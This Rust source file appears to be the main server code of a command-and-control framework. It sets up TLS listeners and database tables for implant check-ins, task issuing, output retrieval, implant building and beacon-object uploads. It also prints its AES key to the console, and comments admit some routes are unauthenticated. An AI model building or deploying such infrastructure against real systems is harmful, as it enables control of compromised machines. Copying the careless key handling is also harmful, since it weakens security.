use actix_web::dev::{ServiceRequest, ServiceResponse};
use actix_web::middleware::Logger;
use actix_web::Error;
use actix_web::{web, web::Data, App, HttpServer};
use bcrypt::{hash, DEFAULT_COST};
use clap::Parser;
use env_logger;
use openssl::rand::rand_bytes;
use openssl::ssl::{SslAcceptor, SslFiletype, SslMethod};
use rusqlite::{params, Connection};
use std::env;
use std::sync::{Arc, Mutex};
use tracing::Level;
use tracing::Span;
use tracing_actix_web::{DefaultRootSpanBuilder, RootSpanBuilder};
mod routes;
use crate::routes::download_file;
use config::{Config, File};
use std::path::Path;
use std::io;
use std::io::Write;
use std::fs::File as stdFile;
use base64::{
    alphabet,
    engine::{self},
    Engine as _,
};

//logging stuffs
pub struct CustomLevelRootSpanBuilder;

impl RootSpanBuilder for CustomLevelRootSpanBuilder {
    fn on_request_start(request: &ServiceRequest) -> Span {
        let level = if request.path() == "/imps" {
            Level::DEBUG
        } else {
            Level::INFO
        };
        tracing_actix_web::root_span!(level = level, request)
    }

    fn on_request_end<B: actix_web::body::MessageBody>(
        span: Span,
        outcome: &Result<ServiceResponse<B>, Error>,
    ) {
        DefaultRootSpanBuilder::on_request_end(span, outcome);
    }
}
//logging

#[derive(Parser, Debug)]
#[clap(version = "1.0", author = "Anvil")]
struct Args {
    #[clap(short, long)]
    debug: bool,
}

//struct for users
#[derive(Debug, serde::Deserialize)]
struct User {
    username: String,
    password: String,
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    std::env::set_var("RUST_LOG", "actix_web=trace,actix_server=trace");

    env_logger::init();

    //ignoring warning for not using this for now since we will want it later
    //let _args: Args = Args::parse();

    let mut settings = Config::default();
    settings
        .merge(File::with_name("config"))
        .expect("Failed to open configuration file");

    let private_key: String = settings
        .get("cert.private_key")
        .expect("Failed to get private_key");
    let certificate: String = settings
        .get("cert.certificate")
        .expect("Failed to get certificate");

    env::set_var("PRIVATE_KEY", private_key);
    env::set_var("CERTIFICATE", certificate);

    //set private key and certificate from environment variables

    let private_key = env::var("PRIVATE_KEY").expect("PRIVATE_KEY must be set");
    let certificate = env::var("CERTIFICATE").expect("CERTIFICATE must be set");

    let private_key_clone = private_key.clone();
    let certificate_clone = certificate.clone();

    // Setup keys for encryption
    // Setup AES key for encryption
    let aes_key_path = "aes_key.bin";
    
    let aes_key = if Path::new(aes_key_path).exists() {
        // Load existing AES key from file
        load_key_from_file(aes_key_path)?
    } else {
        // Generate new AES key
        let aes_key = generate_aes_key()?;
        
        // Save AES key to file
        save_key_to_file(&aes_key, aes_key_path)?;
        
        aes_key
    };

    const CUSTOM_ENGINE: engine::GeneralPurpose =
    engine::GeneralPurpose::new(&alphabet::URL_SAFE, engine::general_purpose::NO_PAD);
    
    // Set the AES key in an environment variable
    let encoded_aes_key = CUSTOM_ENGINE.encode(&aes_key);
    std::env::set_var("AES_KEY", encoded_aes_key.clone());
    println!("AES key generated and stored.");
    println!("encoded AES key: {}", encoded_aes_key);
    
    println!("AES key generated and stored.");

    // Create ssl builder
    let mut builder_443 = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
    builder_443
        .set_private_key_file(private_key, SslFiletype::PEM)
        .unwrap();
    builder_443.set_certificate_chain_file(certificate).unwrap();

    let mut builder_8443 = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
    builder_8443
        .set_private_key_file(private_key_clone, SslFiletype::PEM)
        .unwrap();
    builder_8443
        .set_certificate_chain_file(certificate_clone)
        .unwrap();

    //init db
    //TODO 12/06/23 - add a command that can be sent from conduit TUI clients to wipe the current database. also add a command flag to wipe db on startup?

    let database_url = "./my_database.db";
    let db = Arc::new(Mutex::new(
        Connection::open(&database_url).expect("Cannot open database"),
    ));

    let mut settings = Config::default();
    settings
        .merge(File::with_name("config"))
        .expect("Failed to open configuration file");

    let users: Vec<User> = settings
        .get_array("users")
        .unwrap()
        .into_iter()
        .map(|u| u.try_into().unwrap())
        .collect();
    // Create table and populate it with default username and password
    {
        let db = db.lock().unwrap();
        db.execute(
            "CREATE TABLE IF NOT EXISTS users (
              username TEXT PRIMARY KEY,
              password TEXT NOT NULL
          )",
            params![],
        )
        .expect("Failed to create table");

        //for every user in the config file, insert the username and password into the database
        for user in users {
            let hashed_password =
                hash(user.password, DEFAULT_COST).expect("Failed to hash password");

            db.execute(
                "INSERT OR REPLACE INTO users (username, password) VALUES (?1, ?2)",
                params![user.username, hashed_password],
            )
            .expect("Failed to insert data");
        }

        //let hashed_password = hash("forge", DEFAULT_COST).expect("Failed to hash password");
        /*
        db.execute(
            "INSERT OR REPLACE INTO users (username, password) VALUES (?1, ?2)",
            params!["forge", hashed_password],
        )
        .expect("Failed to insert data");
        */
        // Create table for unique identifiers
        db.execute(
            "CREATE TABLE IF NOT EXISTS unique_identifiers (
              id TEXT PRIMARY KEY
          )",
            params![],
        )
        .expect("Failed to create table for unique identifiers");

    //add a default adversary id to the database

    /* 
        db.execute(
            "INSERT OR REPLACE INTO unique_identifiers (id) VALUES (?1)",
            params!["adversary"],
        )
        .expect("Failed to insert data");
    */
    
        // DEV NOTE: removed a default value "adversary" from unique ids. 
        // this is part of moving from testing to public release, so if i broke stuff, check back here

        // Create a table for Imps to be logged post check-in
        db.execute(
            "CREATE TABLE IF NOT EXISTS imps (
                id INTEGER PRIMARY KEY,
                session TEXT NOT NULL,
                ip TEXT NOT NULL,
                username TEXT NOT NULL,
                domain TEXT NOT NULL,
                os TEXT NOT NULL,
                imp_pid TEXT NOT NULL,
                process_name TEXT NOT NULL,
                sleep TEXT NOT NULL,
                last_check_in TEXT NOT NULL
            )",
            params![],
        )
        .expect("Failed to create table for imps");
        //make a route for imps to send their info to, post checkin

        // Create table for tokens
        db.execute(
            "CREATE TABLE IF NOT EXISTS tokens (
              token TEXT PRIMARY KEY
          )",
            params![],
        )
        .expect("Failed to create table for tokens");

        //TESTING: removing from public release. check back if broke

        /*
        // insert a token to be used for testing
        db.execute(
            "INSERT OR REPLACE INTO tokens (token) VALUES (?1)",
            params!["test_token"],
        )
        .expect("Failed to insert token");
*/
        //END TESTING

        // Create table for tasks
        db.execute(
            "CREATE TABLE IF NOT EXISTS tasks (
                token TEXT NOT NULL,
                task TEXT NOT NULL
            )",
            params![],
        )
        .expect("Failed to create table for tasks");

        // Create table for imp_tokens
        db.execute(
            "CREATE TABLE IF NOT EXISTS imp_tokens (  
                  token TEXT PRIMARY KEY
              )",
            params![],
        )
        .expect("Failed to create table for imp_tokens");

        //Create table for imp_outputs
        db.execute(
            "CREATE TABLE IF NOT EXISTS outputs (
                    id INTEGER PRIMARY KEY,
                    token TEXT NOT NULL,
                    task TEXT NOT NULL,
                    output TEXT NOT NULL
                )",
            params![],
        )
        .expect("Failed to create table for outputs");
    }
    //end init db

    let db_443 = Arc::clone(&db);
    //let builder_443 = builder.clone();

    //placing imports here during testing
    use std::thread;
    //use actix_rt::System;

    // server for port 443
    let server_443 = thread::spawn(move || {
        let sys = actix_rt::System::new;
        let srv = HttpServer::new(move || {
            let logger = Logger::default(); // Use the default actix_web logger
            let app = App::new()
                .wrap(logger)
                .app_data(Data::new(db_443.clone()))
                .route("/js", web::post().to(routes::check_in)) //protected
                .route("/index", web::post().to(routes::index)) //protected
                .route("/return_out", web::post().to(routes::return_out)) //protected
                .route("/download", web::get().to(download_file)); //needs auth tested
            app
        })
        .bind_openssl("0.0.0.0:443", builder_443)?
        .run();
        sys().block_on(srv)
    });

    let db_8443 = Arc::clone(&db);
    //let builder_8443 = builder.clone();

    //server for port 8443
    let server_8443 = thread::spawn(move || {
        let sys = actix_rt::System::new;
        let srv = HttpServer::new(move || {
            let logger = Logger::default(); // Use the default actix_web logger
            let app = App::new()
                .wrap(logger)
                .app_data(Data::new(db_8443.clone()))
                //.app_data(Data::new(AppState { uploads: Mutex::new(HashMap::new()) })) // Add this line
                //i dont remember what the above line was for
                .app_data(web::PayloadConfig::new(10 * 1024 * 1024)) // 10 Megabytes
                .route("/imps", web::get().to(routes::get_connected_imps)) //has auth
                .route("/issue_task", web::post().to(routes::issue_task)) //has auth
                .route("/authenticate", web::post().to(routes::authenticate)) //protected
                .route("/build_imp", web::post().to(routes::build_imp)) //has auth
                .route("/retrieve_out", web::get().to(routes::retrieve_out)) //cant recall why there is 2 of these
                .route("/retrieve_all_out", web::get().to(routes::retrieve_all_out)) //cant recall why there is 2 of these
                //i think retrieve_all_out is because outputs were not being removed from the db and kept repeating. i dont recall
                .route("/bofload", web::post().to(routes::receive_chunk)); //needs auth tested
            app
        })
        .bind_openssl("0.0.0.0:8443", builder_8443)?
        .run();
        sys().block_on(srv)
    });

    let _ = server_443.join().unwrap()?;
    let _ = server_8443.join().unwrap()?;

    Ok(())
}

fn load_key_from_file(path: &str) -> io::Result<Vec<u8>> {
    std::fs::read(path)
}

fn save_key_to_file(key: &[u8], path: &str) -> io::Result<()> {
    let mut file = stdFile::create(path)?;
    file.write_all(key)?;
    Ok(())
}

fn generate_aes_key() -> io:: Result<Vec<u8>> {
    let mut aes_key = vec![0; 32]; // 256-bit key for AES-256
    rand_bytes(&mut aes_key).map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    Ok(aes_key)
}